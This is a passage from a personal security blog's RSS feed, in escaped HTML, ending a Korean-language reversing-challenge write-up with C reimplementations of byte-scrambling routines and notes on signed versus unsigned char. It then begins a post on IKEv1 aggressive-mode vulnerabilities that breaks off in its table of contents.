&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev4_2_sub_1580&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 4k+1, 4k+3rd elements&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev5_sub_16e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0x00~0xff hence, 0xff+1 == 0x00&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rev6_sub_172E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+16h] [rbp-2h]&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+16h] [rbp-2h]&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+16h] [rbp-2h]&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+16h] [rbp-2h]&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+17h] [rbp-1h]&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+17h] [rbp-1h]&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+17h] [rbp-1h]&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+17h] [rbp-1h]&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+17h] [rbp-1h]&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+17h] [rbp-1h]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ii&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ii&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이것저것 시행착오를 거친 끝에 정답을 구할 수 있었다.&lt;/p&gt;

&lt;p&gt;정말 중요한 사실: char 타입은 음수가 될 경우 출력이나 연산에 사용 시 자동으로 int type로 전환되어 사용된다. 이걸 몰라서 한참 헤맸다.&lt;/p&gt;

&lt;p&gt;따라서 음수가 되는 경우를 무시하고 0x00~0xff 범위 내부를 순환하도록 하고 싶다면 char가 아닌 unsigned char로 정의하고, 함수에 인자를 전달할 때에도 반드시 해당 형식으로 전달해야 한다.&lt;/p&gt;

&lt;p&gt;파이썬으로 작성했다면 훨씬 편했을 텐데… 하…. 포인터를 쓰고 싶어서 C 언어로 작성하는 바람에 type 관련해서 정말 힘들었다.&lt;/p&gt;

&lt;p&gt;문제 정말 어렵더라. 더 화이팅 해보자!&lt;/p&gt;
</description>
        <pubDate>Wed, 30 Aug 2023 23:05:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/paper_study/reversing/chaining</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/paper_study/reversing/chaining</guid>
      </item>
    
      <item>
        <title>Searching for IPSec Vulnerability from Its Specification Level</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#section01-about-the-ipsec&quot; id=&quot;markdown-toc-section01-about-the-ipsec&quot;&gt;&lt;strong&gt;Section01. About the IPSec&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section02-vulnerability-reported-for-ikev1&quot; id=&quot;markdown-toc-section02-vulnerability-reported-for-ikev1&quot;&gt;&lt;strong&gt;Section02. Vulnerability Reported for IKEv1&lt;/strong&gt;&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#2-1-description&quot; id=&quot;markdown-toc-2-1-description&quot;&gt;&lt;strong&gt;2-1) Description&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-2-impact&quot; id=&quot;markdown-toc-2-2-impact&quot;&gt;&lt;strong&gt;2-2) Impact&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-3-solution&quot; id=&quot;markdown-toc-2-3-solution&quot;&gt;&lt;strong&gt;2-3) Solution&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-4-details-of-the-vulnerability&quot; id=&quot;markdown-toc-2-4-details-of-the-vulnerability&quot;&gt;&lt;strong&gt;2-4) Details of the vulnerability&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section03-aggressive-mode-and-its-vulnerable-points---rfc2409&quot; id=&quot;markdown-toc-section03-aggressive-mode-and-its-vulnerable-points---rfc2409&quot;&gt;&lt;strong&gt;Section03. Aggressive mode and its vulnerable points - RFC2409&lt;/strong&gt;&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#3-1-ikev1-phase1-authenticated-with-signatures&quot; id=&quot;markdown-toc-3-1-ikev1-phase1-authenticated-with-signatures&quot;&gt;&lt;strong&gt;3-1) &lt;mark&gt;IKEv1 Phase1 Authenticated with Signatures&lt;/mark&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
